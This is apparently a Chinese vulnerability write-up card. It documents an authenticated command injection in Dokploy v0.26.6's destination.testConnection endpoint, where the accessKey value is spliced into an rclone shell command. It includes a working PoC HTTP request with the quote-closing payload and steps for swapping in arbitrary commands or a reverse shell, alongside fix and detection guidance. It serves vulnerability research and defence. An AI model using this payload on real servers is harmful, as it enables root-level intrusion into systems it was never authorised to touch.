---
id: web-nodejs-dokploy-destination-testconnection-rclone-command-injection
title: Dokploy v0.26.6 destination.testConnection：accessKey 闭合双引号注入 rclone 命令执行
type: scenario
domain: web
path: web/nodejs
technique: dokploy-destination-rclone-command-injection
aliases:
- Dokploy RCE
- destination.testConnection 命令注入
- rclone 命令注入
- accessKey 注入
- Dokploy tRPC RCE
tags:
- dokploy
- nodejs
- command-injection
- rclone
- trpc
- child-process
- exec
- rce
cve: []
severity: critical
confidence: high
status: verified
affected_versions: Dokploy v0.26.6（原文）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V33
  verified_at: '2026-11-05T06:01:49+08:00'
  notes: 已对照原文与7张截图核对：destination.testConnection 模板字符串拼接 accessKey 进 rclone 命令、execAsync→child_process.exec 链路与原文一致；img02 确认错误信息回显 uid=0(root)；原文概述称未授权但代码为 adminProcedure 且 PoC 带会话，卡内已按认证后 RCE 修正；affected_versions=v0.26.6 与原文一致，未在本机复现
---

## 一句话结论

Dokploy v0.26.6 的 `/api/trpc/destination.testConnection` 把用户可控的 `accessKey`、`secretAccessKey` 等字段用双引号包进 `rclone` 命令字符串，再交给 `child_process.exec`（经 `execAsync`）执行；攻击者在 `accessKey` 中闭合双引号并注入 `; id >&2; exit 1; echo "`，即可让子 Shell 执行任意命令，命令输出随 tRPC 错误信息返回。

## 原理

- **命令构造**：`apps/dokploy/server/api/routers/destination.ts` 的 `testConnection` 从输入取 `accessKey`、`secretAccessKey`、`bucket` 等，构造数组 `--s3-access-key-id="${accessKey}"`、`--s3-secret-access-key="${secretAccessKey}"`，再 `join(" ")` 拼成 `rclone ls ... ":s3:${bucket}"`。
- **转义缺失**：参数值只用双引号包裹，未对 `"`、`;`、`$()`、反引号等 Shell 元字符做转义；输入 `x"; id >&2; exit 1; echo "` 会把命令变成 `--s3-access-key-id="x"; id >&2; exit 1; echo ""`，分号结束当前命令并执行 `id`。
- **Sink 是 `exec` 而非 `execFile`**：`packages/server/src/utils/process/execAsync.ts` 用 `util.promisify(exec)` 封装 `child_process.exec`；`exec` 会启动 `/bin/sh -c` 解析整条命令字符串，因此 `;`、`|`、`&&`、`$()` 等元字符生效。`execFile` 不经过 Shell，不会有该问题。
- **回显**：控制器捕获异常后把错误信息返回给 tRPC 客户端；payload 把命令输出重定向到 stderr（`id >&2`），因此 `uid=...` 会出现在错误消息中。原文截图确认返回 `uid=0(root) gid=0(root)`。
- **权限说明**：原文概述称“未授权”，但代码中该 mutation 使用 `adminProcedure`，且 PoC 请求携带 `better-auth.session_token`；应按“认证后 RCE（需管理员会话）”理解。若存在会话劫持/弱口令/鉴权绕过，则可放大为未授权。

## 触发条件

- Dokploy v0.26.6（或包含同样拼接逻辑的版本）。
- 攻击者拥有可调用 `destination.testConnection` 的会话（`adminProcedure`，通常为管理员）。
- 服务端可执行 `rclone`，且 `destination.ts` 走非 `IS_CLOUD` 分支调用 `execAsync`。
- 输入字段未经过 Shell 转义/白名单；`execAsync` 使用 `child_process.exec`。
- 响应会将异常信息返回给客户端（tRPC 默认行为）。

## 利用步骤

1. 获取有效管理员会话 Cookie（`better-auth.session_token`）。
2. 向 `/api/trpc/destination.testConnection` 发送 JSON，`accessKey` 填入闭合双引号 + 命令 + 注释/退出：
   `x"; id >&2; exit 1; echo "`
3. 其他字段补全为合法值（`provider=minio`、`secretAccessKey`、`bucket`、`region`、`endpoint`），确保代码进入 rclone 命令构造。
4. 读取响应中的错误信息，确认 `uid=...` 输出。
5. 替换 `id` 为任意命令（读文件、写文件、反弹 Shell）；若输出被截断，可写入文件后通过其它接口读取。
6. 也可尝试 `secretAccessKey`、`bucket` 等同样被模板字符串拼接的字段。

## PoC

```http
POST /api/trpc/destination.testConnection HTTP/1.1
Host: target:3001
Cookie: better-auth.session_token=<管理员会话>
Content-Type: application/json

{
  "json": {
    "name": "rce-verify",
    "provider": "minio",
    "accessKey": "x\"; id >&2; exit 1; echo \"",
    "secretAccessKey": "secret",
    "bucket": "bucket",
    "region": "us-east-1",
    "endpoint": "http://127.0.0.1:9000"
  }
}
```

响应错误信息中包含：

```text
... rclone ls ... uid=0(root) gid=0(root) groups=0(root) ...
```

## 变体与关联

- 变体（注入字段）：`secretAccessKey`、`bucket` 等同样进入命令字符串的字段；任何未转义的模板插值都可能注入。
- 变体（命令分隔）：`;`、`|`、`&&`、`$()`、反引号；若双引号被过滤，可尝试其它闭合方式或参数位置。
- 变体（回显）：`>&2` 把输出带到 stderr；也可写文件、DNS/HTTP 外带。
- 关联：[[web-nodejs-dokploy-compose-appname-stored-command-injection]]（同一产品的存储型命令注入）。
- 关联：[[web-nodejs-dokploy-certificate-path-traversal-file-write]]（同一产品的路径穿越文件写入）。
- 关联：[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（不同层面的命令执行，仅作对照）。
- 边界：`adminProcedure` 需要管理员会话；`IS_CLOUD` 分支不走本地 `execAsync`；目标未安装 `rclone` 时命令可能先失败。

## 检测与防御

- 修复：改用 `child_process.execFile('rclone', ['ls', `--s3-access-key-id=${accessKey}`, ...])`，参数以数组传递、不经过 Shell；或使用 `spawn` 并禁用 `shell: true`。
- 输入校验：对 accessKey/secretAccessKey/bucket/region 做严格字符白名单（如仅字母数字与有限符号），拒绝引号、分号、空白、`$`、反引号。
- 权限：`testConnection` 仅对可信管理员开放并做二次确认；Dokploy 进程以非 root 运行，限制 `rclone` 与出网权限。
- 检测：请求字段中出现 `"`、`;`、`|`、`&&`、`$(`、反引号；tRPC 错误信息中出现 `uid=`、`gid=`、`root`；Dokploy 进程异常派生 `sh`/`id`/`rclone` 子进程；`destination.testConnection` 调用频率/来源异常。
- 运营：审计所有 `execAsync`/`exec` 调用点，统一迁移到 `execFile`/`spawn` 参数数组；对命令构造做代码扫描。
